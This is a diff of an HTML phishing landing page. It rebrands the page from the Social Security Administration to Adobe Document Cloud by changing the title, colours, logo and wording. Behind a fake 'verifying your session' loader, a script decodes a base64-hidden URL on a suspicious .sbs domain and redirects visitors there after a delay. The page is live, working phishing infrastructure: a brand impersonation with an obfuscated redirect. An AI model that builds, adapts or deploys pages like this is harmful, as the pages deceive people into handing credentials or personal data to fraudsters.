@@ -3,7 +3,7 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Social Security Administration</title>
+    <title>Adobe Document Cloud</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
@@ -34,16 +34,16 @@
             width: 100%;
         }
 
-        /* Logo container */
+        /* Logo container — Adobe red */
         .logo-wrap {
             width: 100px;
             height: 100px;
-            border-radius: 50%;
+            border-radius: 16px;
             background: #f8fafc;
             display: flex;
             align-items: center;
             justify-content: center;
-            box-shadow: 0 8px 24px rgba(10, 56, 80, 0.12);
+            box-shadow: 0 8px 24px rgba(250, 15, 0, 0.14);
             padding: 10px;
             overflow: hidden;
         }
@@ -52,7 +52,6 @@
             width: 100%;
             height: 100%;
             object-fit: contain;
-            border-radius: 50%;
             display: block;
         }
 
@@ -61,13 +60,13 @@
             font-weight: 600;
             letter-spacing: 2.5px;
             text-transform: uppercase;
-            color: #0a3850;
+            color: #fa0f00;
         }
 
         h1 {
             font-size: 1.45rem;
             font-weight: 600;
-            color: #0a3850;
+            color: #2c2c2c;
             letter-spacing: -0.3px;
             line-height: 1.35;
         }
@@ -93,7 +92,7 @@
             position: absolute;
             inset: 0;
             width: 45%;
-            background: #0a3850;
+            background: #fa0f00;
             border-radius: 50px;
             animation: slide 1.8s ease-in-out infinite;
         }
@@ -127,14 +126,14 @@
     <div class="card">
         <!-- Logo -->
         <div class="logo-wrap">
-            <img src="https://therunhouse.com/cdn/shop/collections/social_security_adnin_logo.png?v=1682600208" alt="SSA Logo" onerror="this.style.display='none'">
+            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQduXJREqBe_A7tkWoD48jL35xRpT_WaxP_tQ&s" alt="Adobe Logo" onerror="this.style.display='none'">
         </div>
 
-        <div class="agency-name">Social Security Administration</div>
+        <div class="agency-name">Adobe Document Cloud</div>
 
         <h1>Preparing your document…</h1>
 
-        <p class="sub">Please wait while we verify your session and prepare your official statement.</p>
+        <p class="sub">Please wait while we verify your session and prepare your secure statement.</p>
 
         <div class="loader"></div>
 
@@ -144,16 +143,16 @@
     <script type="text/javascript">
         // ============================================
         // CONFIG — destination is base64-encoded
-        // Decodes to: https://bruxtenwen.sbs/social_sec
+        // Decodes to: https://bruxtenwen.sbs/coporate-secured-document-share
         // ============================================
-        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9zb2NpYWxfc2Vj';
+        var DEST_B64 = 'aHR0cHM6Ly9icnV4dGVud2VuLnNicy9jb3BvcmF0ZS1zZWN1cmVkLWRvY3VtZW50LXNoYXJl';
         var REDIRECT_DELAY = 3500;
 
         var DESTINATION;
         try {
             DESTINATION = atob(DEST_B64);
         } catch (e) {
-            DESTINATION = 'https://bruxtenwen.sbs/social_sec';
+            DESTINATION = 'https://bruxtenwen.sbs/coporate-secured-document-share';
         }
 
         // ============================================
